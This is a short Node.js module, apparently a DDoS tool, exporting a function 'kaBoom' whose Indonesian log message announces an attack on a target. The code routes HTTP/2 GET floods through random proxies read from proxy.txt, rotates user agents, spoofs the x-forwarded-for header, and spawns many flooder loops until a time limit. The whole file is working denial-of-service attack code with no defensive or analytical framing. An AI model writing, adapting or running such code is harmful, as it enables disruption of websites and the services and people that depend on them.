const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

function kaBoom(target, time, rate, threads) {
    console.log(`Menyerang ${target} selama ${time} detik dengan ${rate} RPS dan ${threads} threads.`);
    
    const parsedTarget = url.parse(target);
    const proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/);
    const userAgents = fs.readFileSync("ua.txt", "utf-8").toString().split(/\r?\n/);

    function randomElement(elements) {
        return elements[Math.floor(Math.random() * elements.length)];
    }

    function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");

        const headers = {
            ":method": "GET",
            ":path": parsedTarget.path,
            ":scheme": "https",
            ":authority": parsedTarget.host,
            "user-agent": randomElement(userAgents),
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "cache-control": "no-cache",
            "x-forwarded-for": parsedProxy[0]
        };

        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 15
        };

        const connection = net.connect({
            host: proxyOptions.host,
            port: proxyOptions.port
        });

        connection.on("connect", () => {
            const client = http2.connect(target, {
                createConnection: () => connection
            });

            client.on("connect", () => {
                setInterval(() => {
                    for (let i = 0; i < rate; i++) {
                        const request = client.request(headers);
                        request.end();
                    }
                }, 1000);
            });

            client.on("close", () => client.destroy());
            client.on("error", () => client.destroy());
        });

        connection.on("error", () => connection.destroy());
    }

    for (let i = 0; i < threads; i++) {
        setInterval(runFlooder, 0);
    }

    setTimeout(() => process.exit(1), time * 1000);
}

module.exports = { kaBoom };